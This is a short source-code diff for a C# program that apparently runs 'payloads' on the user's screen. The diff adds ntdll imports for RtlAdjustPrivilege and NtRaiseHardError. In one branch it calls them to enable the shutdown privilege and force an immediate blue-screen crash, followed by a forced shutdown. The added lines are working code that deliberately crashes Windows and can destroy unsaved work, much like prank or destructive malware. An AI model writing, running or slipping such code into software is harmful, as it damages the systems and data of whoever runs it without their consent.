@@ -17,7 +17,11 @@ namespace purghe
 		public static extern bool AllocConsole();
 		[DllImport("kernel32.dll")]
 		public static extern bool FreeConsole();
-		
+		[DllImport("ntdll.dll")]
+		public static extern uint NtRaiseHardError(uint error, uint nParams, uint unicodeMask, IntPtr parameters, uint validResponse, out uint response);
+		[DllImport("ntdll.dll")]
+		public static extern IntPtr RtlAdjustPrivilege(int privilege, bool enablePrivilege, bool isThreaded, out bool previous);
+
 		Graphics graphics;
 		Random rand;
 		Thread payloadThread;
@@ -104,6 +108,8 @@ namespace purghe
 								MessageBox.Show("NO!");
 								break;
 							case 3:
+								RtlAdjustPrivilege(19, true, false, out _);
+								NtRaiseHardError(0xffffffff, 0, 0, IntPtr.Zero, 6, out _);
 								Process.Start("shutdown", "/s /t 0");
 								break;
 							default: break;
